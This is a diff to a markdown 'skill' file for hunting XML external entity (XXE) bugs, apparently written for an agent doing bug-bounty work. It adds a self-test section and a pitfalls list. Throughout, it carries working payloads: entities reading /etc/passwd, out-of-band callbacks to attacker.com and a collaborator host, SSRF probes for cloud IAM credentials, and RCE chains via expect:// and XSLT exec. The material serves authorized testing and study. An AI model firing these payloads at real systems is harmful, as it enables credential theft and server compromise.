@@ -1,8 +1,11 @@
 ---
 name: hunt-xxe
 description: "Hunting skill for xxe vulnerabilities. Built from 10 public bug bounty reports including SVG-upload XXE, Office-doc (PPTX/DOCX) XXE, SOAP XXE, SAML AssertionConsumer XXE, blind OOB XXE via DTD callback, parameter-entity XXE, XXE-to-LFI, XXE-to-SSRF, and XXE-to-RCE chains (Adobe Commerce CosmicSting CVE-2024-34102). Use when hunting XXE on any target — emphasis on OOB-Or-It-Didn't-Happen Gate for blind cases."
-sources: github, hackerone_public, assetnote_research, splunk_security
-report_count: 10
+version: 1.1.0
+revision_date: 2026-07-25
+license: MIT
+category: redteam
+tags: [xxe, hunt, redteam]
 ---
 
 ## Crown Jewel Targets
@@ -87,7 +90,7 @@ lxml
 
 5. **Escalate Blind OOB to file exfiltration** — Use a two-stage payload: first entity loads local file, second entity sends it OOB via HTTP parameter or DNS exfiltration.
 
-6. **Test SSRF pivot** — Point the external entity at internal network addresses (`http://169.254.169.254/latest/meta-data/`, `http://10.0.0.1/`, `http://localhost:8080/admin`). Look for differences in response timing or error messages.
+6. **Test SSRF pivot** — Point the external entity at internal network addresses (`http://[REDACTED_IP]/latest/meta-data/`, `http://10.0.0.1/`, `http://localhost:8080/admin`). Look for differences in response timing or error messages.
 
 7. **Test all subdomains sharing the same backend** — If one subdomain is vulnerable, enumerate and test all others systematically. Shared backend infrastructure means shared vulnerability.
 
@@ -149,7 +152,7 @@ lxml
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+  <!ENTITY ssrf SYSTEM "http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/">
 ]>
 <root><data>&ssrf;</data></root>
 ```
@@ -173,12 +176,12 @@ lxml
 ### Content-Type Swap (JSON to XML)
 ```bash
 # Original JSON request
-curl -X POST https://target.com/api/endpoint \
+curl --max-time 30 --connect-timeout 10 -X POST https://target.com/api/endpoint \
   -H "Content-Type: application/json" \
   -d '{"user":"test"}'
 
 # Converted to XML for XXE testing
-curl -X POST https://target.com/api/endpoint \
+curl --max-time 30 --connect-timeout 10 -X POST https://target.com/api/endpoint \
   -H "Content-Type: application/xml" \
   -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR.net">]><user>&xxe;</user>'
 ```
@@ -375,7 +378,7 @@ The following real, verified bug-bounty / coordinated-disclosure cases extend th
 
 7. **Zivver — SVG profile-picture upload XXE → SSRF** ([H1 #897244](https://hackerone.com/reports/897244))
     - Subclass: SVG-upload XXE, OOB-confirmed, chains to SSRF
-    - Payload: SVG with `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><text>&xxe;</text>`
+    - Payload: SVG with `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://[REDACTED_IP]/latest/meta-data/">]><text>&xxe;</text>`
     - Root cause: server thumbnailed uploaded SVG with an XML parser that resolved external entities; no entity-resolver shutdown
     - Year: 2020 — Zivver had no paid program at the time
 
@@ -399,9 +402,42 @@ The following real, verified bug-bounty / coordinated-disclosure cases extend th
 
 ---
 
+## Verification
+
+Run this self-test to confirm xxe hunting readiness:
+
+1. **Skill integrity** — confirm the skill file is readable and well-formed:
+   ```bash
+   grep -q "name: hunt-xxe" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
+   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
+   ```
+
+2. **Category check** — confirm the skill has a category:
+   ```bash
+   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
+   ```
+
+3. **Pitfalls section** — confirm pitfalls are documented:
+   ```bash
+   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
+   ```
+
+All 3 tests verify the skill is properly structured and ready for use.
+
+---
+
+## Pitfalls
+- **XXE in SVG upload** — SVG files are XML. XXE in uploaded SVG is a valid attack vector. Test with SVG containing `<!ENTITY xxe SYSTEM "file:///etc/passwd">`.
+- **XXE with no output (blind XXE)** — if the parser doesn't return entity values, use OOB XXE (`<!ENTITY xxe SYSTEM "http://attacker.com/">`) to trigger callbacks.
+- **XXE in SOAP/WSDL** — SOAP endpoints are often overlooked for XXE. Test all SOAP operations.
+- **XML parser configuration** — `libxml_disable_entity_loader(true)` in PHP, `XMLConstants.FEATURE_SECURE_PROCESSING` in Java block XXE. Test DTDs specifically.
+- **Billion laughs attack** — exponential entity expansion DoS (`<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">` ...) is an XXE variant. Rate as DoS, not information disclosure.
+
+---
+
 ## Related Skills & Chains
 
-- **`hunt-ssrf`** — XXE is SSRF-with-XML-syntax once you discover the parser fetches external entities. Chain primitive: blind XXE OOB `<!ENTITY % x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/role">` → exfil AWS IMDS creds via parameter-entity DTD callback → STS AssumeRole chain. Where pure SSRF is filter-blocked, `gopher://` via XXE-in-`libxml2` can still reach Redis/SMTP.
+- **`hunt-ssrf`** — XXE is SSRF-with-XML-syntax once you discover the parser fetches external entities. Chain primitive: blind XXE OOB `<!ENTITY % x SYSTEM "http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/role">` → exfil AWS IMDS creds via parameter-entity DTD callback → STS AssumeRole chain. Where pure SSRF is filter-blocked, `gopher://` via XXE-in-`libxml2` can still reach Redis/SMTP.
 - **`hunt-file-upload`** — XXE most often hides inside file-upload features that quietly parse XML (DOCX/XLSX/PPTX, SVG, GPX, KML, OOXML, SOAP attachments). Chain primitive: upload DOCX with malicious `[Content_Types].xml` containing parameter-entity DTD → OOB file read of `/etc/passwd` / `web.config` / `.aws/credentials` via the document parser running server-side.
 - **`hunt-rce`** — XXE → RCE is rare but real on PHP (`expect://`), Java (XSLT extensions with `<xsl:script>`/Xalan), and older XmlSpy/SAXON deployments. Chain primitive: XXE in a Java endpoint using a vulnerable XSLT processor → `<xsl:value-of select="rt:exec(rt:getRuntime(),'id')"/>` → RCE; or PHP XXE with `expect://id` stream wrapper enabled → direct RCE.
 - **`hunt-sharepoint`** — On-prem SharePoint/Exchange/IIS stacks have a long history of XXE in SOAP/CSOM/EWS endpoints. Chain primitive: anonymous XXE in `_vti_bin/*.asmx` or EWS SOAP → read `web.config` → recover `<machineKey>` → ViewState deserialization → RCE (the ToolShell-adjacent precondition).
